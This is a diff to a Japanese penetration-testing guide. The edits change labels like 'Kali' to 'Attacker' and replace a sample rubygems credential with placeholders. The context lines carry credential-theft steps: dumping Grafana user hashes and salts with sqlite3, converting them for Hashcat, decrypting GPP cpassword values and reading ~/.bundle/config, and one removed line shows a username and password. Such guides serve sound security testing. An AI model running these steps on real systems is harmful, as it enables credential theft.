@@ -160,7 +160,7 @@ sqlite3 grafana.db "SELECT id, name, login, email, password, salt FROM user;"
 取得したハッシュを Hashcat (mode 10900) 形式に変換する：
 
 ```python
-# [Kali] 以下のスクリプトはKali（攻撃側）のマシンで実行する。ターゲット上では実行しない。
+# [Attacker] 以下のスクリプトはテスター端末で実行する。ターゲット上では実行しない。
 import base64, binascii
 
 salt = b'[SALT_STRING]'
@@ -198,7 +198,7 @@ print(f'sha256:10000:{base64.b64encode(salt).decode()}:{base64.b64encode(hash_by
 ### 手順
 
 ```bash
-# gpp-decrypt（Kali Linux 標準搭載）
+# gpp-decrypt（ペネトレ用Linuxディストリ標準搭載）
 gpp-decrypt '[cpassword 属性の値]'
 
 # 取得できる情報を確認
@@ -301,7 +301,7 @@ cat ~/.bundle/config
 **出力例：**
 ```yaml
 ---
-BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "[USER]:[PASSWORD]"
 ```
 
 フォーマット説明：
